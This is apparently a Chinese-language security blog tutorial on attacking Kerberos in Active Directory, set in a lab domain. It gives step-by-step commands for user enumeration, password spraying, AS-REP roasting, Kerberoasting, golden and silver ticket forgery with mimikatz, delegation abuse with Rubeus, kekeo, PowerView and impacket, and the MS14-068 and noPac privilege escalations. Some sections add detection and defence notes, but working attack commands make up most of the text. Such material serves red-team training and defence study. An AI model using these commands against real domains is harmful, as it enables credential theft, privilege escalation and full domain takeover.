---
title: "kerberos攻击专题"
date: 2025-12-11T00:00:00+08:00
draft: false

---

#  kerberos攻击专题

由于kerberos协议认证的基础流程前面文章已经详细解释了，这里就直接进入攻击阶段

总的来看kerberos可以归结于两个字：票据，前面提到了各阶段的安全问题：

![image-20240621224304346](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240621224306896-1548204939.png)

### AS-REQ阶段

#### 域内用户名枚举

AS-REQ中的cname表示请求的用户名，用户名是否存在会影响返回包的内容，因此可以进行域内用户名枚举

##### 方法

可以使用kerbrute进行枚举：
使用编译好的工具，我们能够在一台不在域内（即域外）的机器上和DC进行通信的机器上枚举域内用户：

~~~cmd
kerbrute_windows_amd64.exe userenum --dc 192.168.111.100 -d yuy0ung.com user.txt
~~~

![image-20250109213426373](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250109213426373.png)

当然还有python脚本https://github.com/3gstudent/pyKerbrute

msf上也有`kerberos_enumusers`模块

##### 检测与防御

* 流量：检测同一IP短时间内是否发送了大量的AS-REQ包
* 日志：默认情况下，对于不存在的用户名发起的AS-REQ包不会有任何记录（记录需要更改组策略），所以日志层面不好检测

#### 密码喷洒

而用户名存在时，密码的正确与否也会影响返回包，这里虽然可以进行密码爆破，但连续针对同一账户的密码猜测很有可能会导致账户被锁定，因此有了密码喷洒喷洒攻击：即在猜解密码时，使用每个密码去尝试所有用户名

##### 方法

该攻击同样可以在域外进行，但并不支持kerberos

可以使用kerbrute进行喷洒：

~~~cmd
kerbrute_windows_amd64.exe passwordspray --dc 192.168.111.100 -d yuy0ung.com user.txt Admin123456
~~~

![image-20250109214210923](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250109214210923.png)

当然，如果域没有密码锁定策略，可以直接对单个用户进行爆破：

~~~cmd
kerbrute_windows_amd64.exe bruteuser --dc 192.168.111.100 -d yuy0ung.com user.txt pass.txt
~~~

##### 检测与防御

* 流量：检测同一IP短时间内是否发送了大量的AS-REQ包
* 日志：登录成功会产生日志4768，且结果代码为0x0，登录失败日志不做记录

### AS-REP阶段

#### AS-REP Roasting

对于域用户，如果设置了选项”不要求kerberos域身份验证”，此时向域控制器的88端口发送AS_REQ请求，对收到的AS_REP请求enc-part的cipher进行组合解密就能获得用户的明文。（enc-part底下的cipher，这部分是使用用户hash加密session-key)

![image-20250109215421485](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250109215421485.png)

##### 方法

* 获取Hash

  可以使用Rbeus自动搜索满足条件的用户，并获取login session key：

  ~~~cmd
  Rubeus.exe asreproast /format:john /outfile:hash.txt
  ~~~

* 再使用john进行离线破解即可：

  ~~~cmd
  john --wordlist=/opt/pass.txt hash.txt
  ~~~

##### 检测与防御

* 检测域中是否设置了“不要求kerberos域身份验证”，如果存在及时关闭
* 日志：重点关注事件ID为4768且预身份验证类型为“不要求kerberos域身份验证”属性用户发起的Kerberos认证

#### 黄金票据攻击

在AS-REP阶段，返回的TGT的加密部分是由krbtgt用户的密钥加密的，因此，如果我们获得了krbtgt的密钥，我们就可以自己制作一个TGT，该票据被称为黄金票据

攻击需要的信息：域名、域sid、krbtgt的HTLM hash

* 在DC运行mimikatz：

  ~~~cmd
  mimikatz.exe "Log" "privilege::Debug" "lsadump::lsa /patch" "exit"
  ~~~

  ![image-20250109210332524](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250109210332524.png)

* 得到krbtgt的hash之后，先使用域成员主机win10尝试访问DC的CIFS服务，发现不可访问：

  ~~~cmd
  dir \\DC01\c$
  ~~~

  ![image-20250109225508356](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250109225508356.png)

* 利用mimikatz生成黄金票据：

  ~~~cmd
  kerberos::golden /admin:Administrator /domain:yuy0ung.com /sid: S-1-5-21-593678850-2817278497-901338050 /krbtgt:2b88afb2409dbc10ea5be4f35e497639 /ticket:ticket.kirbi
  ~~~

  再导入：

  ~~~cmd
  kerberos::ptt ticket.kirbi
  ~~~

  ![image-20250110132150052](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250110132150052.png)

* 再次访问CIFS服务：

  ![image-20250110132229546](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250110132229546.png)

可以看见成功访问了

### TGS-REQ阶段

#### kerberoasting攻击

ST是用服务的密钥加密，因此，如果我们能获取到ST，就可以尝试对ST进行破解，得到服务的密钥，造成了Kerberoasting攻击

还有一个原因是当用户向KDC发起TGS-REQ时，不论用户是否有服务的访问权限，只要TGT正确，KDC都会返回ST

##### 步骤

* 提供正常域用户密码进行认证，获得TGT
* 攻击者使用TGT请求指定SPN的ST
* KDC在验证后返回服务hash加密的ST
* 离线破解ST，爆破出服务的明文密码

我们需要爆破的是ticket中的enc_part,这里直接使用工具来提取enc_part

自动实现工具，不需要mimikatz，普通用户权限即可：https://github.com/EmpireProject/Empire/commit/6ee7e036607a62b0192daed46d3711afc65c3921

提取高权限用户ID：

~~~powershell
Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation
~~~

将得到的hash值丢去hashcat进行破解，有概率得到明文密码：

~~~cmd
hashcat -m 13100 hash.txt pass.txt --force
~~~

##### 检测与防御

* 确保服务账户为强密码，并定期修改
* kerberoasting能成功，很大的原因在于KDC返回的ST是使用RC4_HMAC_MD5加密的，能够比较简单的进行加密，如果使用AES256_HMAC方式对kerberos票据进行加密，即使获取了ST也难以解密，但是这种加密存在一些兼容性问题
* 很多服务在域中被分配了过高的权限，导致破解了该服务的密码后能够迅速实现权限提升，所以针对最好采取最小化权限原则
* 对于日志审计，重点关注事件ID为4769（请求kerberos服务票据操作）的日志，如果该类日志过多，可以从中筛选票据加密类型为0x17（RC4-HMAC）的日志
* 定期检测域内危险的SPN可以使用工具zbang

#### 白银票据攻击

因为ST是用服务的密钥加密，如果我们获取到服务的密钥，就可以签发任意的ST，这个票据又称为白银票据，即完成了白银票据攻击

制作银票的条件：

```
1.域名称
2.域的SID值
3.域中的Server服务器账户的NTLM-Hash
4.伪造的用户名，可以是任意用户名.
5.目标服务器上面的kerberos服务
```

银票服务列表：

~~~
服务名称                    同时需要的服务
WMI                        HOST、RPCSS
PowerShell Remoting        HOST、HTTP
WinRM                    HOST、HTTP
Scheduled Tasks            HOST
Windows File Share        CIFS
LDAP                    LDAP
Windows Remote Server    RPCSS、LDAP、CIFS
~~~

##### 步骤

* 在DC上以管理员权限运行mimikatz：

  ~~~cmd
  mimikatz.exe "log" "privilege::debug" "lsadump::dcsync /domain:yuy0ung.com /user:DC01$"
  ~~~

  ![image-20250110144112859](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250110144112859.png)

  获取到域控的hash和域sid：

  ~~~
  ntlm:e70729095731c9b18a2a9ec08092a624
  sid:S-1-5-21-593678850-2817278497-901338050
  ~~~

* 伪造cifs服务票据：

  ~~~cmd
  kerberos::golden /domain:yuy0ung.com /sid:S-1-5-21-593678850-2817278497-901338050 /target:DC01.yuy0ung.com /service:cifs /rc4:e70729095731c9b18a2a9ec08092a624 /user:Administrator /ptt
  ~~~

  ![image-20250110150331477](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250110150331477.png)

* 可以在缓存中查看到伪造的票据：

  ~~~cmd
  klist
  ~~~

  ![image-20250110150627384](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250110150627384.png)

  

#### 委派

这是一种大型网络经常部署的应用模式，给多跳认证带来了很多便利

但随之而来的是安全问题，攻击者可以利用委派和其他楼栋打组合拳实现本地提权甚至是域内提权，还可以制作深度隐藏的后门

举个例子：

Yuy0ung经过kerberos验证访问webserver下载文件，但文件实际存在于后台的文件服务器上，于是webserver模拟Yuy0ung的身份继续以kerberos协议认证到文件服务器，文件服务器返回文件给webserver，webserver在返回文件给Yuy0ung，这就是一个委派的流程

在域中，只有主机账户（机器账户）和服务账户（）具有委派属性

##### 非约束性委派

服务账户可以获取被委派用户的TGT，并将TGT缓存到lsass进程中，进而服务账户可以用该TGT模拟该用户访问任意服务

非约束性委派需要的SeEnableDelegationPrivilege特权默认仅授予域管理员和企业管理员

大致流程：

![52a6674aa3649c902b571d17a0dffc0f](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/52a6674aa3649c902b571d17a0dffc0f.jpg)

如上图，从攻击者角度来看，如果控制了服务1，那么当管理员访问了服务1，便可以在服务1上获取管理员TGT，以此访问任意服务包括域控

可以使用adfind在域内主机查找非约束性委派用户：

~~~cmd
Adfind.exe -b "DC=yuy0ung,DC=com" -f "(&(objectCategory=computer)(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" cn distinguishedName

#服务账户
(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))
#机器账户
(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))
~~~

如果域管访问过服务直接就能拿到凭据：

~~~cmd
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
~~~

但上面的方法很局限，必须让管理员访问指定服务

特定情况下可以利用Spooler打印机服务让域控主动连接，即强迫运行打印服务（Print Spooler）的主机向目标主机发起 Kerberos 或 NTLM 认证请求

* 域成员主机上，以管理员权限启动Rubeus监听：

  ~~~cmd
  Rubeus.exe monitor /interval:1 /filteruser:DC01$
  ~~~

* 利用SpoolSample（详见github）强制DC对本机进行认证，即可抓取到TGT

* 导入TGT：

  ~~~cmd
  Rubeus.exe ptt /ticket:base64
  ~~~

* 利用mimikatz进行dcsync即可获取hash，制作黄金票据接管域控

  这里获取的TGT实际上是DC的机器账户，机器账户没有访问CIFS的权限，但是在LDAP中会被当做域控，可以尝试dcsync

  当然也可以直接mimikatz导出票据

##### 约束性委派

由于非约束性委派的不安全性，微软发布了约束性委派，对kerberos引入S4U

对于约束性委派，服务账户只能获取该用户对指定服务的ST，从而只能模拟该用户访问特定的服务

步骤：

![11d21c3627b6b02c1b5103ae8cf4131e](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/11d21c3627b6b02c1b5103ae8cf4131e.jpg)

这里，约束委派的前置条件是服务自身需要通过KDC认证的TGT

攻击角度上看，如果获取了服务1的权限，就可以伪造S4U先请求自身的ST，利用此ST便可以伪造任意用户请求来获取服务2的ST

* adfind寻找约束性委派主机：

  ~~~cmd
  AdFind.exe -b "DC=redteam,DC=red" -f "(&(samAccountType=805306368)(msds-allowedtodelegateto=*))" cn distinguishedName msds-allowedtodelegateto
  ~~~

* 以client02对DC01的CIFS服务存在约束委派为例

  在知道服务用户hash的情况下，使用kekeo请求client02的TGT：

  ~~~cmd
  tgt::ask /user:client02 /domain:yuy0ung.com /NTLM:<服务hash> /ticket:s4u.kirbi
  ~~~

* 伪造S4U请求，以administrator权限访问受委派的CIFS服务：

  ~~~cmd
  tgs:: s4u /tgt:TGT_client02@YUY0UNG.COM_krbtgt~yuy0ung.com@YUY0UNG.COM.kirbi /user:Administrator/service:cifs/dc01.yuy0ung.com
  ~~~

* 利用mimikatz导入S4U2proxy阶段生成的ST即可访问CTFS服务

当然还可以利用Rubeus更方便或使用impacket套件能直接获得shell

##### 基于资源的约束性委派

不需要域管理员设置，而是把设置属性的权限赋予了机器自身

基于资源的约束委派，不需要传统约束委派的高配置权限(SeEnableDelegation权限),如果我们有服务账户1，只需要具备服务账户2的ldap权限，服务1就能控制服务2，这一步需要配置服务2的MSDS-AllowedToActOnBehalfOfOtherIdentity指向服务1的sid

基于资源的约束性委S4U2self阶段的ST是不可转发的

从攻击视角来看：

- 有一个服务账户1/机器账户(把域内机器提权到SYSTEM相当于有了一个账户)，如果我们只有普通的域内用户，可以滥用MachineAccountQuota。
- 获取服务账户2的LDAP权限
- 配置服务1对服务2的基于资源的约束委派，对服务2添加sid的指向
- 发起一个服务1到服务2的正常约束委派流程，从而访问服务2

那么首先是找到可修改msDS-AllowedToActOnBehalfOfOtherIdentity的用户

已知机器账户，找到使其加入域中的用户账户，这个用户账户就具备修改`msDS-AllowedToActOnBehalfOfOtherIdentity`的权限：

~~~cmd
# 使用adfind.exe查找机器账户的mS-DS-CreatorSID属性
AdFind.exe -h 192.168.30.10 -b "DC=hack,DC=com" -f "objectClass=computer" mS-DS-CreatorSID

# 使用Powershell反查SID对应的用户
powerpick $objSID = New-Object System.Security.Principal.SecurityIdentifier SIF-VALUEs;$objUser = $objSID.Translate([System.Security.Principal.NTAccount]);$objUser.Value
~~~

由用户查询其加入域中的机器

已知用户查找到通过该用户加入域中的机器

~~~cmd
# 查用户账户SID
whoami /all

# 使用PowerView查经由该用户加入域内的机器账户(主机)
# 需要具备GeneriCall或WriteProperty等修改权限
import-module PowerView.ps1
Get-DomainObejctAcl -Identity PC | ?{$_.SecurityIdentifier -match "S-1-5-21-754643614-3937478331-2139222398-1116"}
~~~

攻击：

* powermad创建用户

  ~~~cmd
  import-moduel powermad.ps1
  New-MachineAccount -MachineAccount testv -Password $(ConvertTo-SecureString "!qaz@WSX" -AsPlainText -Force)
  ~~~

* 为目标主机添加资源委派，指向新建机器账户的sid：

  ~~~cmd
  #查询该机器账户的sid,使用powerview
  Get-NetComputer testv -Properties objectsid
  objectsid
  ---------
  S-1-5-21-754643614-3937478331-2139222398-1122
  #配置testv到PC的基于资源的约束委派，即修改PC的属性指向testv的sid
  $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-754643614-3937478331-2139222398-1122)";$SDBytes = New-Object byte[] ($SD.BinaryLength);$SD.GetBinaryForm($SDBytes, 0);Get-DomainComputer PC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
  #查询一下是否添加成功
  Get-DomainComputer PC -Properties msds-allowedtoactonbehalfofotheridentity
  ~~~

* 利用rubeus申请票据：

  ~~~cmd
  # 通过Rubeus申请机器账户testv$的TGT
  Rubeus.exe asktgt /user:testv$ /password:!qaz@WSX /domain:hack.com /dc:DC.hack.com /nowrap /outfile:testv.kirbi
  
  # 使用S4U2Self协议申请TGS并且使用S4U2Proxy协议请求cifs服务票据ST，注入内存中
  Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/PC.hack.com /dc:DC.hack.com /nowrap /ptt /ticket:your-ticket
  ~~~

  当然也可以使用impacket：

  ~~~cmd
  # 使用getST.py申请票据
  python3 getST.py hack.com/testv$:\!qaz@WSX -spn cifs/PC.hack.com -impersonate administrator -dc-ip <ip>
  
  # 导入票据
  export KRB5CCNAME=administrator.ccache
  
  # 直接登录
  python3 wmiexec.py -k PC.hack.com -no-pass -dc-ip <ip>
  python3 psexec.py -k PC.hack.com -no-pass -dc-ip <ip>
  ~~~

* 此时能够访问cifs服务了，可以尝试使用psexec进行连接获取高权限shell

### PAC

#### MS14-068

这是一个域内提权漏洞

漏洞成因是KDC无法正确检查PAC中的有效签名，因为PAC签名实现的加密允许所有的加密算法，只要客户端指定任意签名算法，KDC就会使用这个指定的算法验证签名，这里就可以指定使用不需要相关密钥的算法比如md5，那么我们就可以自己伪造PAC，实现伪造自己用户的SID和所在的组

通过上面的描述可以知道，我们可以伪造自己为域管理员组的成员实现域内提权

* 旧版server比如win2008 server上利用kekeo即可实现利用：

  ~~~cmd
  kekeo.exe "exploit::ms14068 /domain:yuy0ung.com /user:username /password:password /ptt" "exit"
  ~~~

* 当然也可以使用impacket中的goldenPac直接获取交互式shell

#### CVE-2021-42287（nopac）

漏洞利用流程：

* 利用SAMR协议创建无SPN的机器账户machine$
* 修改机器账户machine$的saMAccountName属性为DC01
* 以AD01的账户请求TGT
* 将机器账户machine$的saMAccountName属性还原为machine$
* 利用S4U2self协议，以域管的身份请求DC01的服务，请求中带上上一步的TGT，此时KDC会查询DC01，发现账户不存在，于是又查询DC01$，查询到是域控，于是允许域控发起S4U2self请求自身的服务，返回域管理员权限访问DC服务的ST
* 接下来就可以使用高权限票据执行高权限操作了

上述过程可以直接使用工具nopac.exe一步到位：

~~~cmd
noPac.exe -domain yuy0ung.com -user hack -pass Admin123456 /dc DC01.yuy0ung.com /mAccount machine /mpassword root /service cifs /ptt
~~~

运行完成即可生成票据并导入内存
